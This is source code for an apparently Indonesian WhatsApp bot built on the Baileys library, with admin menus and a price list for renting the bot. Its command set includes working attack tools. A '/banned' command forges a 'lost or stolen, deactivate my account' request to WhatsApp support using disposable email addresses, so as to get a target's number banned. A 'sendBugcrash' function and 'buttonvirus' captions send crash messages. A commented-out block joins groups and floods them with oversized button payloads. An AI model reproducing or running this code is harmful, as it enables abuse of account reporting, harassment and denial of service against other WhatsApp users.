const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = '𝙫𝙖𝙣𝙣'
global.ownerNumber = ["085381568989@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sir ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sir, Please Chat Owner...',
}

module.exports = rixx = async (rixx, rixxbotwhatsapp, chatUpdate, store) => {
try {
        const body = (rixxbotwhatsapp.mtype === 'conversation') ? rixxbotwhatsapp.message.conversation : (rixxbotwhatsapp.mtype == 'imageMessage') ? rixxbotwhatsapp.message.imageMessage.caption : (rixxbotwhatsapp.mtype == 'videoMessage') ? rixxbotwhatsapp.message.videoMessage.caption : (rixxbotwhatsapp.mtype == 'extendedTextMessage') ? rixxbotwhatsapp.message.extendedTextMessage.text : (rixxbotwhatsapp.mtype == 'buttonsResponseMessage') ? rixxbotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (rixxbotwhatsapp.mtype == 'listResponseMessage') ? rixxbotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (rixxbotwhatsapp.mtype == 'templateButtonReplyMessage') ? rixxbotwhatsapp.message.templateButtonReplyMessage.selectedId : (rixxbotwhatsapp.mtype === 'messageContextInfo') ? (rixxbotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || rixxbotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || rixxbotwhatsapp.text) : ''
        const budy = (typeof rixxbotwhatsapp.text == 'string' ? rixxbotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(rixxbotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = rixxbotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = rixxbotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = rixxbotwhatsapp.pushName || "No Name"
        const botNumber = await rixx.decodeJid(rixx.user.id)
        const itsMerixx = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(rixxbotwhatsapp.sender)
        const itsMe = rixxbotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = rixxbotwhatsapp.quoted ? rixxbotwhatsapp.quoted : rixxbotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = rixxbotwhatsapp.isGroup ? (rixxbotwhatsapp.key.participant ? rixxbotwhatsapp.key.participant : rixxbotwhatsapp.participant) : rixxbotwhatsapp.key.remoteJid
             const isGroup = rixxbotwhatsapp.chat.endsWith('@g.us')
        const groupMetadata = rixxbotwhatsapp.isGroup ? await rixx.groupMetadata(rixxbotwhatsapp.chat).catch(e => {}) : ''
        const groupName = rixxbotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = rixxbotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = rixxbotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = rixxbotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = rixxbotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = rixxbotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = rixxbotwhatsapp.isGroup ? groupAdmins.includes(rixxbotwhatsapp.sender) : false
    	const isAdmins = rixxbotwhatsapp.isGroup ? groupAdmins.includes(rixxbotwhatsapp.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[rixxbotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[rixxbotwhatsapp.sender] = {}
const chats = global.db.chats[rixxbotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[rixxbotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!rixx.public) {
if (!rixxbotwhatsapp.key.fromMe) return
}

if (!rixxbotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(rixxbotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (rixxbotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(rixxbotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (rixxbotwhatsapp.sender.startsWith('212')) return rixx.updateBlockStatus(rixxbotwhatsapp.sender, 'block')

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
rixx.sendPresenceUpdate('composing', from)
rixx.readMessages([rixxbotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return rixx.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `rixx`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return rixx.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(rixxbotwhatsapp.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `𝙫𝙖𝙣𝙣 : ${runtime(process.uptime())}`,jpegThumbnail: fs.readFileSync('./image/thumbnail.jpg')}}}
switch (command) {
case '/admin':{
if (!isGroup) throw `Gak bisa disini`
if (!isBotAdmins) throw `Jadiin gw admin dong biar bisa`
if (!isAdmins) throw `luh siape`
rixx.sendMessage(rixxbotwhatsapp.chat, {text: `┏━━⊱ 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 
┣❏ ᴏᴡɴᴇʀ : 6285381568989
┣❏ ɴᴀᴍᴇ ʙᴏᴛ : Ai
┣❏ ʀᴜɴɴɪɴɢ : ᴘᴀɴᴇʟᴏɴʟʏ
┗━━⊱
╔══════[ 𝑨𝒅𝒎𝒊𝒏 𝑴𝒆𝒏𝒖 ]══════⊱
╠➤stats (Untuk Cek Status) 
╠➤restart
╠➤addakses @ (memberikan akses menggunakan bot)
╠➤delakses @ (sebaliknya)
╠➤kick @
╚════[ 𝙫𝙖𝙣𝙣 ]══════⊱
`}, {quoted: kafloc})
}
break
case '/kick': {
if (!isGroup) throw `Gak bisa disini`
if (!isBotAdmins) throw `Jadiin gw admin dong biar bisa`
if (!isAdmins) throw `luh siape`
let users = rixxbotwhatsapp.mentionedJid[0] ? rixxbotwhatsapp.mentionedJid[0] : rixxbotwhatsapp.quoted ? rixxbotwhatsapp.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rixx.groupParticipantsUpdate(rixxbotwhatsapp.chat, [users], 'remove')
rixxbotwhatsapp.reply("Sukses mengkick target✅")
}
break
case '/restart':{
 if (!isGroup) return rixxbotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return rixxbotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        txts = `SUCCES KAK`
        rixxbotwhatsapp.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case '/sewa':
textsewa = `
╔══════[ 𝙇𝙄𝙎𝙏 𝙎𝙀𝙒𝘼 ]══════⊱
╠➤ 𝙰𝙳𝙳 𝙰𝙺𝚂𝙴𝚂 𝟻𝙺
╠➤ 𝚂𝙴𝚆𝙰 𝙱𝙾𝚃 𝟷 𝙱𝚄𝙻𝙰𝙽 𝟷𝟶𝙺
╠➤ 𝙾𝙿𝙴𝙽 𝙹𝙰𝚂𝙰 𝚁𝚄𝙽 𝙱𝙾𝚃 𝟹𝟶𝙺
╠➤ 𝚂𝙲𝚁𝙸𝙿𝚃 𝙱𝙾𝚃? 𝟹𝟻𝙺
╠➤ wa.me/6285381568989
╚════[ 𝙫𝙖𝙣𝙣 ]══════⊱
`
rixxbotwhatsapp.reply(textsewa)
break
case '/rules':
textrules = `
╔══════[ 𝙍𝙐𝙇𝙀𝙎 ]══════⊱
╠➤ 𝐍𝐎 𝐒𝐏𝐀𝐌 𝐁𝐎𝐓
╠➤ 𝐍𝐎 𝐓𝐄𝐋𝐏𝐎𝐍 𝐁𝐎𝐓
╠➤ 𝐉𝐄𝐃𝐀 𝐌𝐈𝐍𝐈𝐌𝐀𝐋 𝟓 𝐌𝐄𝐍𝐈𝐓
╚════[ 𝙫𝙖𝙣𝙣 ]══════⊱
`
rixxbotwhatsapp.reply(textrules)
break
case '/test':
case '/stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
rixxbotwhatsapp.reply(respon)
}
break
// ADD/DEL AKSES //
case '/delakses':
    if (!isGroup) return rixxbotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return rixxbotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return rixxbotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
rixxbotwhatsapp.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case '/addakses':
 if (!isGroup) return rixxbotwhatsapp.reply(`wajib dalam grup`)
if (!isGroupAdmins) return rixxbotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return rixxbotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rixx.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
rixxbotwhatsapp.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
// BUG VERIF //
case '/banned': {
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
rixxbotwhatsapp.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
// // INI BUG GRUP //
//   case "santetgc":{
//    if (!itsMerixx) return rixxbotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
// if (!isGroupAdmins) return rixxbotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
// rixxbotwhatsapp.reply(`otw bos`)
// if (!q) return reply(`Penggunaan ${prefix+command} link`)
// if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
// let result = args[0].split('https://chat.whatsapp.com/')[1]
// let jumlah = "5"
// for (let i = 0; i < jumlah; i++) {
// let kir = await rixx.groupAcceptInvite(result)
// rixx.sendMessage(kir, {
// text: 'BUG BY CYCLONE', 
// templateButtons: [
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
